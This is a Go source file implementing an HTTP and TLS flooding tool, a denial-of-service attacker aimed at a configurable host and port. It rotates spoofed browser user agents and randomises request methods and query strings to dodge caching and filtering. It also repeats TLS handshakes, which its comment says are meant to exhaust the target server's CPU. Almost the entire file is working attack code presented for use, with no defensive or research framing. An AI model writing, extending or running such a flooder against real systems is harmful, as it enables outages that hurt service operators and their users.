package internals

import (
	"crypto/tls"
	"math/rand"
	"net"
	"strconv"
	"time"
)

type HttpFlooder struct {
	Host     string // target host
	Port     int    // target port
	Duration int    // duration of flood
	Interval int    // interval per request batch
	Secure   bool   // https or not
}

func GenerateRandomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.1 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Safari/537.36",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0",
		"Mozilla/5.0 (Linux; Android 11; SM-A125U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.77 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:108.0) Gecko/20100101 Firefox/108.0",
		// can add more...
	}

	return userAgents[rand.Int()%len(userAgents)]
}

func GenerateRandomRequests(host string) []string {
	methods := []string{"POST", "GET", "PUT", "HEAD", "DELETE", "OPTIONS", "TRACE"}

	rand.Shuffle(len(methods), func(i, j int) {
		methods[i], methods[j] = methods[j], methods[i]
	})

	var requests []string
	for _, method := range methods {
		switch method {
		case "GET":
			requests = append(requests, "GET /?"+strconv.Itoa(rand.Int())+" HTTP/1.1\r\n"+"Host: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
		case "POST":
			requests = append(requests, "POST / HTTP/1.1\r\nHost: "+host+"\r\nContent-Type: application/json\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n{\"message\": \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\r\n\r\n")
		case "PUT":
			requests = append(requests, "PUT "+strconv.Itoa(rand.Int())+".html HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n<!DOCTYPE html>\n<html>\n<p>ABCDEFGHIJKLMNOPQRSTUVWXYZ</p>\n</html>\r\n\r\n")
		case "TRACE":
			requests = append(requests, "TRACE / HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
		case "HEAD":
			requests = append(requests, "HEAD /?"+strconv.Itoa(rand.Int())+" HTTP/1.1\r\n"+"Host: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
		case "OPTIONS":
			requests = append(requests, "OPTIONS / HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
		case "DELETE":
			requests = append(requests, "DELETE / HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n") // delete self lol
		}
	}

	return requests
}

func (flooder *HttpFlooder) Flood() {
	var secureSuccess int = 0

	start := time.Now()
	for time.Since(start) < time.Duration(flooder.Duration)*time.Second {
		if flooder.Secure {
			// attempts to repetitively do cryptographic work on the server's cpu.

			config := &tls.Config{
				InsecureSkipVerify: false,
			}

			conn, err := tls.Dial("tcp", combineHost(flooder.Host, flooder.Port), config)
			if err != nil {
				print_sumthin("failed to establish tls connection!", ERROR)
				continue
			}

			err = conn.Handshake()
			if err != nil {
				print_sumthin("tls handshake failed!", ERROR)
				continue
			}

			err = conn.Close()
			if err != nil {
				print_sumthin("failed to close tls connection!", ERROR)
				continue
			}
			secureSuccess++

			print_sumthin("Successful handshake(s): "+strconv.Itoa(secureSuccess), INFO)

			if flooder.Interval > 0 {
				time.Sleep(time.Duration(flooder.Interval) * time.Second)
			}
		}

		conn, err := net.Dial("tcp", combineHost(flooder.Host, flooder.Port))
		if err != nil {
			print_sumthin("failed to establish connection!", ERROR)
			continue
		}
		defer conn.Close()

		requests := GenerateRandomRequests(flooder.Host)
		for _, request := range requests {
			n, err := conn.Write([]byte(request))
			if err != nil {
				print_sumthin("failed to send request!", ERROR);
				continue
			}
			print_sumthin("Sent: "+strconv.Itoa(n), INFO)
		}

		if flooder.Interval > 0 {
			time.Sleep(time.Duration(flooder.Interval) * time.Second)
		}
	}
}

